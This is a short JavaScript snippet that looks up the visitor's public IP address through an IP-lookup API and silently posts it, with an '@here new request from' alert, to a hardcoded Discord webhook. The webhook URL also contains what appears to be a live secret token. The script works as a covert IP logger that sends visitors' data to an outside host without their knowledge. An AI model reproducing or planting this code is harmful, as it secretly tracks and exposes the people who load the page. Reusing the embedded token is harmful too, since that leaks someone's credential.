const webhookURL = "https://discord.com/api/webhooks/1323573391789264927/ef589nAZ1YweU3e5GEOwyW3oOGkNRprQ011inXHZpizJJdA-_xeM0OFmVPvYw-anzbTu";

// Define the URL of the API
const apiUrl = "https://api.ipify.org?format=json";

// Use fetch to make a GET request
fetch(apiUrl)
  .then(response => response.json())  // Parse the JSON response
  .then(data => {
    send("@here new request from " + data.ip)
  })
  .catch(error => {
    console.error("Error fetching IP:", error);
  });

function send(msg) {
     // Payload to send to the webhook
    const payload = {
        content: msg,  // Text message
    };

    // Send a POST request to the webhook
    fetch(webhookURL, {
    method: "POST",
    headers: {
        "Content-Type": "application/json",  // Set the content type to JSON
    },
    body: JSON.stringify(payload),  // Convert the payload to a JSON string
    })
    .then((response) => {
        if (response.ok) {
        console.log("Message sent successfully!");
        } else {
        console.error("Failed to send message:", response.status);
        }
    })
    .catch((error) => {
        console.error("Error sending message:", error);
    });
}